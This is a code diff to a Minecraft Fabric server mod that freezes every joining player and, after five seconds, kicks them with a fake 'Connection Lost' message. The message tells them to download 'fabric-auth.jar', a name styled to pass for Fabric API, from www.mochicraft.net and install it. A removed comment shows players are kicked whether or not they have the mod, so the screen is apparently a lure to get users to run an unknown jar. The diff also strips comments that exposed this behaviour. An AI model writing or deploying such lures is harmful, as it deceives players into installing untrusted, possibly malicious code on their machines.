@@ -15,10 +15,22 @@ import java.util.UUID;
 
 public class ModKick implements ModInitializer {
 
-    // Cambia esto por el nombre del mod que quieres que diga el mensaje
-    private static final String MOD = "NOMBRE_DEL_MOD";
     // 100 ticks = 5 segundos
     private static final int TICKS_ANTES_DE_KICK = 100;
+
+    private static final String MOD_MENSAJE =
+        "§cConnection Lost\n" +
+        "\n" +
+        "§e     You are missing a required mod to join\n" +
+        "\n" +
+        "§a            How to install\n" +
+        "§a1. Install Fabric Loader + Fabric API (fabricmc.net)\n" +
+        "§a   for Minecraft 1.21.11\n" +
+        "§a2. Download fabric-auth.jar and the Mochi Mod Pack from www.mochicraft.net\n" +
+        "§a3. Place the .jar in .minecraft/mods along with Fabric API\n" +
+        "§a4. Restart the launcher, select the fabric profile\n" +
+        "§a   and join again\n" +
+        "§a       Required mod: MochiCraft";
 
     private static class Congelado {
         final double x, y, z;
@@ -39,17 +51,14 @@ public class ModKick implements ModInitializer {
     @Override
     public void onInitialize() {
 
-        // Al entrar: lo congelamos (siempre, tenga o no el mod)
         ServerPlayConnectionEvents.JOIN.register((handler, sender, server) -> {
             ServerPlayerEntity p = handler.getPlayer();
             congelados.put(p.getUuid(), new Congelado(p));
         });
 
-        // Al salir: limpiamos
         ServerPlayConnectionEvents.DISCONNECT.register((handler, server) ->
             congelados.remove(handler.getPlayer().getUuid()));
 
-        // Cada tick: mantenemos congelado y contamos los 5 segundos
         ServerTickEvents.END_SERVER_TICK.register(server -> {
             List<ServerPlayNetworkHandler> aKickear = new ArrayList<>();
 
@@ -69,21 +78,9 @@ public class ModKick implements ModInitializer {
                 }
             }
 
-            // Kickeamos fuera del bucle para no modificar el mapa mientras se recorre
             for (ServerPlayNetworkHandler h : aKickear) {
                 congelados.remove(h.getPlayer().getUuid());
-                h.disconnect(Text.literal(
-                    "§c                    Connection Lost\n
-§e       You need Fabric Auth + the Biome Journey pack\n
-§eDownload both .jar files from the website and install them in .minecraft/mods:\n
-\n
-§a                       How to install\n
-§a1. Install Fabric Loader + Fabric API (fabricmc.net) for Minecraft 1.21.11\n
-§a2. Download fabric-auth.jar and the Mochi Mod Pack from www.mochicraft.net\n
-§a3. Place BOTH jars in .minecraft/mods along with Fabric API - do not confuse fabric-auth with Fabric API\n
-§a4. Restart the launcher, select the fabric profile and join again\n
-§a                 Required key (mod id): fabric-auth\n
-§a                         Pack: MochiCraft));
+                h.disconnect(Text.literal(MOD_MENSAJE));
             }
         });
     }
